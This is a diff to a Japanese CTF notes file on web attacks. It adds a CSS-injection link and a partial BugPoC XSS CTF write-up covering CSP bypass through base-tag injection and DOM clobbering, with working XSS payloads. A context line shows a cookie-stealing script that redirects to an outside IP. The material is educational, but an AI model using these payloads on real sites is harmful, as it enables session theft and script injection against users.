@@ -140,6 +140,11 @@ console.log(jsonStr);  // {"key1":"value1","key2":"'value2', key1:'fake_value1'"
 ```
 https://www.calc.mie.jp/posts/2017-12-26-json-injection.html   
 
+## CSS Injection
+以下参照。   
+https://diary.shift-js.info/css-injection/   
+JSじゃなくて任意のCSSを埋め込めるときに使えそう。   
+
 # writeup
 ## Reflect / JSON Injection (CONFidence 2020 Teaser)
 https://www.gem-love.com/ctf/2019.html   
@@ -495,10 +500,148 @@ http://78.46.224.80:1337/download.php?zip=<script>eval("location\x2ehref=\"http:
 <script>window["location"] = "http://1558071511/itWorks!"["concat"](document["cookie"]) </script>
 ```
 ちなみに、XMLHttpRequestでflag.zipをゲットする方針では、CSRFトークン付きでないとダメなので、CSRFトークンを取得してからじゃないとダメでめんどくさい…   
-## 
+
+## Base tag Injection / CSP bypass / DOM clobbering (BugPoC XSS CTF November 2020) 
+https://klefz.se/2020/11/10/bugpoc-xss-ctf-november-2020-write-up/   
+環境がまだ動いてる。   
 - **entrypoint**   
-- **概要**   
+![image](https://user-images.githubusercontent.com/56021519/103559132-0012fe00-4ef9-11eb-9b9d-e66b77f7472c.png)   
+入力した値をキラキラに装飾したものを返す。ソースを見ると、以下のようにiframeのsrcでparam=の形で送信されてるっぽい。   
+```html
+<iframe src="frame.html?param=Hello, World!" name="iframe" id="theIframe"></iframe>
+```
+でもaaaとかを入力したときはどうなるかというと、Chromeの開発者ツールで[Network]でJSに絞って検索すると`script.js`,`frame-analytics.js`の二つがある（他はgoogle系のJSなので多分無関係）ので、二つをチェックする。   
+**script.js**  
+```js
+	var isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+	if (!isChrome){
+		document.body.innerHTML = `
+			<h1>Website Only Available in Chrome</h1>
+			<p style="text-align:center"> Please visit <a href="https://www.google.com/chrome/">https://www.google.com/chrome/</a> to download Google Chrome if you would like to visit this website</p>.
+		`;
+	}
+	
+	document.getElementById("txt").onkeyup = function(){
+		this.value = this.value.replace(/[&*<>%]/g, '');
+	};
+
+
+	document.getElementById('btn').onclick = function(){
+		val = document.getElementById('txt').value;
+		document.getElementById('theIframe').src = '/frame.html?param='+val;
+	};
+```
+**frame-analytics.js**  
+```html
+console.log('Frame Analytics Script Securely Loaded');
+console.log('User Agent String: ' + navigator.userAgent);
+console.log('User Agent Vendor: ' + navigator.vendor);
+console.log('User OS: ' + navigator.platform);
+console.log('User Language: ' + navigator.language);
+```
+したがって、`script.js`で`replace(/[&*<>%]/g, '');`によって`onkeyup`イベントが発生すると`&*<>%`を空白に置換した文字列を`param=`にセットして`frame.html`に送信していることがわかる。  
+したがって、次は`frame.html`を見て入力がどうセットされているかを確認する。  
+開発者ツールのConsole上で`window.name="iframe"`としてから、`frame.html?param=<h1>aaaaa</h1>`として送信してみると以下の二か所に埋め込まれる。  
+```html
+	<head>
+		<meta charset="UTF-8">
+		<title>
+			<h1>aaaa</h1>
+		</title>
+```
+```html
+		<section role="container">
+
+			<div role="main">
+				<p class="text" data-action="randomizr">&lt;h1&gt;aaaa&lt;/h1&gt;</p>
+			</div>
+```
+下の方はエスケープされているので上の方でXSSができそう！！   
+`frame.html?param=</title><script>alert(1)</script>`としてアクセスするとちゃんと埋め込めるが、開発者ツールで以下のようなCSPエラーが発生している！  
+![image](https://user-images.githubusercontent.com/56021519/103560702-89c3cb00-4efb-11eb-8ffd-86732a37c6ab.png)  
+CSPに以下のようなルールがセットされているため、`script-src`でインラインスクリプトの実行を禁止されている。  
+```txt
+content-security-policy: script-src 'nonce-bccqgzkdrrmg' 'strict-dynamic'; frame-src 'self'; object-src 'none';
+```
+したがって、CSPをバイパスする必要がある！  
+これをCSP Evaluatorで調べるとBase tag injectionができることがわかる。  
+![image](https://user-images.githubusercontent.com/56021519/103560889-ef17bc00-4efb-11eb-882f-cb644d47f217.png)   
+したがって、正規の`files/analytics/js/frame-analytics.js`の代わりにBase tag injectionによって偽の`frame-analytics.js`を読み込ませることを考える。  
+つまり、以下を送信して、  
+```txt
+</title><base href="http://localhost:4444/">
+```
+WSL上で偽の`frame-analytics.js`を作成してNode.jsコマンドのhttp-serverを使って  
+```txt
+http-server -p 4444 --cors -a 127.0.0.1
+```
+のように用意すると、以下のようにエラーが発生する。   
+![image](https://user-images.githubusercontent.com/56021519/103562612-b75e4380-4efe-11eb-9c1b-b4b0997292f2.png)   
+  
+  
+`frame-analytics.js`は以下のように埋め込まれているため、`integrity`で`frame-analytics.js`のSHA256ハッシュが埋め込まれているものと一致していないとerrorとなってしまう。     
+![image](https://user-images.githubusercontent.com/56021519/103561484-ed022d00-4efc-11eb-923f-adf9d24d20dc.png)   
+該当するソースは以下。`if(fileIntegrity.value)`で`fileIntegrity.value`が定義されていれば`frame-analytics.js`をsrcから読み込むようなintegrity付きのscriptタグを作成する。  
+`fileIntegrity.value`は`window.fileIntegrity || {`で、もし`window.fileIntegrity`が定義されていなければ作成している。  
+```html
+	<script nonce="msatygrlbosu">
+	
+		window.fileIntegrity = window.fileIntegrity || {
+			'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
+			'algorithm' : 'sha256',
+			'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
+			'creationtime' : 1602687229
+		}
+	
+		// verify we are in an iframe
+		if (window.name == 'iframe') {
+			
+			// securely load the frame analytics code
+			if (fileIntegrity.value) {
+				
+				// create a sandboxed iframe
+				analyticsFrame = document.createElement('iframe');
+				analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
+				analyticsFrame.setAttribute('class', 'invisible');
+				document.body.appendChild(analyticsFrame);
+
+				// securely add the analytics code into iframe
+				script = document.createElement('script');
+				script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
+				script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
+				script.setAttribute('crossorigin', 'anonymous');
+				analyticsFrame.contentDocument.body.appendChild(script);
+				
+			}
+
+		} else {
+			document.body.innerHTML = `
+			<h1>Error</h1>
+			<h2>This page can only be viewed from an iframe.</h2>
+			<video width="400" controls>
+				<source src="movie.mp4" type="video/mp4">
+			</video>`
+		}
+		
+	</script>
+```
+ここで、`window.fileIntegrity = window.fileIntegrity || {`の部分にDOM clobberingの脆弱性があるらしく、事前にDOM clobberingで`window.fileIntegrity`を定義してしまえばscriptの先頭の初期化する処理は実行されないことになる！  
+```txt
+// これを送信する
+?param=</title><a id=fileIntegrity><a id=fileIntegrity name=value href=x></a>
+
+// Consoleで　fileIntegrity.value　と入力して値を確認すると、以下が値としてセットされている！
+<a id="fileIntegrity" name="value" href="x"></a>
+```
+ここから先は以下のようなエラーが発生してintegrityのチェックで失敗しているがこれを突破する方法がなんかよく理解できなかった…  
+![image](https://user-images.githubusercontent.com/56021519/103562796-01dfc000-4eff-11eb-96ed-918f6697297c.png)   
+
 - **Payload**   
+以下で動くことになっているが、よくわからん…  
+```js
+window.name = 'iframe';
+window.location = 'https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://<id>.redir.bugpoc.ninja%22%3E%3Ca%20id=fileIntegrity%3E%3Ca%20id=fileIntegrity%20name=value%20href=x%3E'
+```
 ## 
 - **entrypoint**   
 - **概要**   
